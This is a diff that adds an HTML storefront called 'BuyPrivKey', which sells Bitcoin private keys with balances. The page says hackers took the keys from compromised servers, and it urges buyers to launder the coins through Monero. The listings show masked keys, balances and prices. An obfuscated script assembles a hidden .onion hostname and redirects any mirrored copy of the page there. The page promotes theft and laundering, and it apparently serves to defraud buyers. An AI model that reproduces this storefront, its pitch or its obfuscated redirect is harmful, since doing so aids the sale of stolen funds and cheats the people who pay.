@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+	<title>BITCOIN ADDRESS MARKET | BuyPrivKey |</title>
+	<style>
+		body,
+		html {
+			font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
+			color:#fff
+
+		}
+
+		html {
+
+			background-color: #444;
+			background-image: url(back.jpg)
+		}
+
+		.electrumPhoto:hover .electrumPhotoHover {
+			opacity: 1;
+			width: 788px;
+			height: 413px;
+			border-radius: 8px;
+		}
+
+		.electrumPhoto {
+			position: relative;
+			background-size: cover;
+			width: 200px;
+			height: 102px;
+			display: inline-block;
+			border: 1px solid rgb(103, 14, 121);
+			background-color: #aaa
+		}
+
+		.electrumPhotoHover {
+			background-color: #aaa;
+			position: absolute;
+			background-size: cover;
+			width: 0px;
+			height: 0px;
+			top: -1px;
+			left: -1px;
+			opacity: 0;
+			transition: all ease 0.2s;
+			box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+			z-index: 999;
+			cursor: pointer;
+		}
+
+		.details>span {
+			display: block;
+			font-size: 18px;
+			margin-top: 10px;
+		}
+
+		.details span span {
+			font-size: 12px;
+			color: #f00;
+		}
+
+		.details div {
+			cursor: pointer;
+			margin-top: 10px;
+			margin-bottom: -15px;
+			background-color: rgb(255, 187, 0);
+			height: 30px;
+			width: 120px;
+			border-radius: 4px;
+			border: 1px solid rgb(6, 163, 40);
+			box-shadow: inset 0px 13px 0px 0px #fff3, inset 1px 1px 0px #ffffffb3, 1px 1px 0px #0003;
+			text-align: center;
+			line-height: 30px;
+			font-size: 20px;
+			background-image: url(buy.png);
+			background-repeat: no-repeat;
+			background-position: 5px center;
+			background-size: 16%;
+			transition:all ease 0.2s;
+		}
+
+		.details div:hover {
+			box-shadow: inset 0px 10px 0px 0px rgba(255,255,255,0.4), inset 1px 1px 0px #ffffffb3, 1px 1px 10px #0003;
+			background-color:rgb(255, 232, 0);
+			border: 1px solid #fff100;
+		}
+
+		.sold {
+			overflow: hidden;
+		}
+
+		.sold:hover {
+			overflow: unset
+		}
+
+		.sold:hover:before {
+			display: none
+		}
+
+		.sold:before {
+			content: "SOLD";
+			width: 122%;
+			height: 40px;
+			background-color: rgb(255, 0, 0);
+			position: absolute;
+			left: -20px;
+			top: 29px;
+			transform: rotate(38deg);
+			text-align: center;
+			font-size: 30px;
+			line-height: 40px;
+			box-shadow: 0 0 15px #0006;
+			font-family: Impact, Charcoal, sans-serif;
+		}
+
+		hr {
+			margin: 20px 0 80px 0;
+			border: none;
+			border-top: 1px solid #888;
+			height: 1px;
+
+		}
+
+		.all {
+
+			background-color: rgba(0, 0, 0, 0.65);
+			width: 1000px;
+			padding: 30px;
+			height: 100%;
+			margin: 0 auto;
+			margin-top: -20px;
+		}
+
+		table {
+			width: 1000px;
+			margin: 0 auto;
+		}
+
+		.key {
+			font-size: 0px;
+			color: transparent;
+			text-align: center;
+			background-color: #ffffff29;
+			padding: 6px;
+			position:relative;
+			overflow:hidden;
+			box-shadow: 0 0 20px #0000004d;
+border-radius: 66px;
+
+		}
+		
+		.key.sold,.key.sold a{
+			color:#757575 !important
+		}
+
+		.key:before{
+
+			width: 30% !important;
+			height: 40px !important;
+			left: -64px !important;
+			top: 10px !important;
+			color: #000 !important;
+			transform: rotate(38deg) !important;
+		}
+
+		.key:hover {
+		
+			overflow: hidden !important; 
+		}
+		
+		.key:hover:before {
+			display: block !important;
+		}
+
+		.key a {
+			font-size: 20px;
+			color: #f00;
+			text-decoration:none
+		}
+
+		.photos {
+			vertical-align: top;
+			padding-top: 15px;
+			width: 420px;
+		}
+
+		.photos p {
+			font-size: 11px
+		}
+
+		.desc {
+			width: 80%;
+			margin: 0 auto;
+			text-align: center;
+			margin-bottom: 60px;
+			font-size:14px;			
+		}
+		.desc b{
+			margin-top: 29px;
+		font-size: 16px;
+		display: block;
+		margin-bottom: -20px;
+		padding: 0;
+		}
+		.soldBuy{    
+			background-color: #5d5d5d !important;
+		box-shadow: inset 0px 13px 0px 0px rgba(255,255,255,0.08), inset 1px 1px 0px #777, 1px 1px 0px #0003 !important;
+		border: 1px solid #585858 !important;
+		color: #333 !important;
+		}
+
+		.soldBuy:hover {
+			background-color: #5d5d5d !important;
+			box-shadow: inset 0px 13px 0px 0px rgba(255,255,255,0.08), inset 1px 1px 0px #777, 1px 1px 0px #0003 !important;
+			border: 1px solid #585858 !important;
+			color: #333 !important;
+		}
+
+
+		.logo {
+			height: 125px;
+			width: 100%;
+			background-image: url(logo.png);
+			background-repeat: no-repeat;
+			background-position: center;
+			margin-top: 20px;
+			margin-bottom: 30px;
+		}
+
+		a{
+		color:#000;
+		text-decoration:none;
+		}
+		.desc a{
+		color:#ffb0b0;
+		text-decoration:none;
+		}
+
+		.subtitle{
+			font-size: 23px;
+		text-align: center;
+		}
+	</style>
+</head>
+
+<body>
+	<div class='all'>
+
+
+
+		<div class="logo"></div>
+		<div class="desc">
+
+Welcome to BuyPrivKey. In this site you can buy some Bitcoin Private Keys with balance.<br>
+		<b>What's a Private key?</b><br>
+		Basicaly a private key is a secret number that allows to be spent bitcoins of a bitcoin address<br>
+		Whit a private Key you can spent all bitcoin address balance.<br>
+		<b>How?</b><br>
+		We sell you a private key and you can import it to your wallet. Look at this tutorial on how to do it: 
+		<a href="http://docs.electrum.org/en/latest/faq.html#can-i-import-private-keys-from-other-bitcoin-clients" target="_blank">Electrum Wallet</a> 
+		| <a href="https://en.bitcoin.it/wiki/Help:How_to_import_private_keys_in_Bitcoin_Core_0.7%2B" target="_blank">Bitcoin Core</a> 
+		<br>
+		<b>Who we are?</b><br>
+		We are a team of hackers who are very interested in the find some exploits.
+		We find exploits in some internet servers and computers. When we have access to a server, 
+		We find private keys and wallet files inside.
+		Our team prefer buy the private keys and no spend it, because we don't want to be investigated.
+		If we spend all Bitcoin address balance, maybe the authorities can investigate us.
+		But if different people spend the Bitcoin, nobody investigate anything.<br>
+		<b>Why trust us?</b><br>
+		You can see some screenshots of our Electrum wallet with the private keys.
+		And you can check the balance of the bitcoin address in the <a href="https://www.blockchain.com/" target="_blank">Blockchain</a>.<br>
+		<b>Recommendations</b><br>
+		We send the private key to the first person who send a payment for it and it will be marked as sold.<br>
+		Our team recommend change the the Bitcoin to Monero
+		</div>
+<script>var u=new Array(9).join('2'),d='3',a='z',f=';',j='p',r='7',i='.',t=',',m='q',s='5',p='n',y='l',o='2',x='o',w='i';
+if(window.location.href.indexOf(u+d+r+a+d+m+s+o+y)===-1) window.location.replace('http://'+u+d+r+a+d+m+s+o+y+i+x+p+w+x+p);</script>
+		<p class="subtitle">Available Bitcoin address to Buy</p>
+		<hr>
+		<table>
+
+			
+
+				
+				
+				<tr>
+					<td colspan="2" class="key sold">
+						<a href="https://www.blockchain.com/btc/address/1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9" target="_blank">1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9'>
+						<div class="electrumPhoto sold" style="background-image:url(1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9.jpg)"></div>
+						</div>
+						<div class="electrumPhoto sold" style="background-image:url(1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1ArALrvzZvAYaafvWTTiMJkU7Epi8fsSq9_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5J5JuU******************************tD6k9qXBv
+						</span>
+						<span>
+							<span>Balance:</span>
+							0 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0 BTC
+						</span>
+					
+						<div class="soldBuy">Buy </div>
+						
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key ">
+						<a href="https://www.blockchain.com/btc/address/1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p" target="_blank">1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p'>
+						<div class="electrumPhoto " style="background-image:url(1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p.jpg)"></div>
+						</div>
+						<div class="electrumPhoto " style="background-image:url(1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5JQc1i******************************jsLi2RuJF
+						</span>
+						<span>
+							<span>Balance:</span>
+							0.38014011 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0.025 BTC
+						</span>
+					
+
+					<a href='/buy/1KiwrKyV6o6ZrGxDH7Cu3yN2LqhdWfiZ2p'>
+					<div>Buy </div>
+					</a>
+					
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key sold">
+						<a href="https://www.blockchain.com/btc/address/18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX" target="_blank">18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX'>
+						<div class="electrumPhoto sold" style="background-image:url(18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX.jpg)"></div>
+						</div>
+						<div class="electrumPhoto sold" style="background-image:url(18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(18XcCyhr8iALNQxqw41PwxkZnrhEcSaszX_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5JtQLy******************************gUiMQBfx9
+						</span>
+						<span>
+							<span>Balance:</span>
+							0 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0 BTC
+						</span>
+					
+						<div class="soldBuy">Buy </div>
+						
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key ">
+						<a href="https://www.blockchain.com/btc/address/1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8" target="_blank">1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8'>
+						<div class="electrumPhoto " style="background-image:url(1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8.jpg)"></div>
+						</div>
+						<div class="electrumPhoto " style="background-image:url(1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5Jh7ZT******************************39Ppjg6CB
+						</span>
+						<span>
+							<span>Balance:</span>
+							0.57693545 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0.038 BTC
+						</span>
+					
+
+					<a href='/buy/1HbSwoayWYjAE3BRn3vS5KJU68FpdDACA8'>
+					<div>Buy </div>
+					</a>
+					
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key sold">
+						<a href="https://www.blockchain.com/btc/address/1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy" target="_blank">1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy'>
+						<div class="electrumPhoto sold" style="background-image:url(1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy.jpg)"></div>
+						</div>
+						<div class="electrumPhoto sold" style="background-image:url(1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1EgrBHTQa1raHYF2nTz8Zo9Y7mr4SWiiUy_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5Jftz5******************************Y8CYKPyUG
+						</span>
+						<span>
+							<span>Balance:</span>
+							0 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0 BTC
+						</span>
+					
+						<div class="soldBuy">Buy </div>
+						
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key sold">
+						<a href="https://www.blockchain.com/btc/address/1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m" target="_blank">1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m'>
+						<div class="electrumPhoto sold" style="background-image:url(1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m.jpg)"></div>
+						</div>
+						<div class="electrumPhoto sold" style="background-image:url(1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1Gyza1hXzt4t5TiRV9t3NZQZ2SxrmVda6m_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5JCxK2******************************rRosAaGLU
+						</span>
+						<span>
+							<span>Balance:</span>
+							0 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0 BTC
+						</span>
+					
+						<div class="soldBuy">Buy </div>
+						
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key ">
+						<a href="https://www.blockchain.com/btc/address/1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i" target="_blank">1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i'>
+						<div class="electrumPhoto " style="background-image:url(1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i.jpg)"></div>
+						</div>
+						<div class="electrumPhoto " style="background-image:url(1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5KGp3P******************************39Ppjg6CB
+						</span>
+						<span>
+							<span>Balance:</span>
+							1 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0.067 BTC
+						</span>
+					
+
+					<a href='/buy/1KwCFuU3Y9T4qF3Xt55SbDzWbkdQhMkW9i'>
+					<div>Buy </div>
+					</a>
+					
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key sold">
+						<a href="https://www.blockchain.com/btc/address/19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx" target="_blank">19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx'>
+						<div class="electrumPhoto sold" style="background-image:url(19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx.jpg)"></div>
+						</div>
+						<div class="electrumPhoto sold" style="background-image:url(19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(19dXGqdNVmFzcGcUbgYrth7Var2Z4gtbpx_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5KFKo1******************************AHqndJKEA
+						</span>
+						<span>
+							<span>Balance:</span>
+							0 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0 BTC
+						</span>
+					
+						<div class="soldBuy">Buy </div>
+						
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+				
+				
+				<tr>
+					<td colspan="2" class="key ">
+						<a href="https://www.blockchain.com/btc/address/19vzbmMRfYhB5CF9U93U3rTJstQF736ARC" target="_blank">19vzbmMRfYhB5CF9U93U3rTJstQF736ARC</a>
+						
+					</td>
+				</tr>
+				<tr>
+					<td class='photos'>
+						<p>Images from Electrum wallet:</p>
+						<a href='/buy/19vzbmMRfYhB5CF9U93U3rTJstQF736ARC'>
+						<div class="electrumPhoto " style="background-image:url(19vzbmMRfYhB5CF9U93U3rTJstQF736ARC.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(19vzbmMRfYhB5CF9U93U3rTJstQF736ARC.jpg)"></div>
+						</div>
+						<div class="electrumPhoto " style="background-image:url(19vzbmMRfYhB5CF9U93U3rTJstQF736ARC_p.jpg)">
+							<div class="electrumPhotoHover" style="background-image:url(19vzbmMRfYhB5CF9U93U3rTJstQF736ARC_p.jpg)"></div>
+						</div>
+						</a>
+
+					</td>
+					<td class='details'>
+						<span>
+							<span>Privkey:</span>
+							5JCX6E******************************gb33HePmg
+						</span>
+						<span>
+							<span>Balance:</span>
+							5 BTC
+						</span>
+						</span>
+						<span>
+							<span>Price:</span>
+							0.833 BTC
+						</span>
+					
+
+					<a href='/buy/19vzbmMRfYhB5CF9U93U3rTJstQF736ARC'>
+					<div>Buy </div>
+					</a>
+					
+					
+						<span>
+
+						</span>
+
+					</td>
+				</tr>
+
+				<tr>
+					<td colspan="2">
+						<hr>
+					</td>
+				</tr>
+				<tr>
+
+
+					
+
+
+		</table>
+
+	</div>
+</body>
+
+</html>
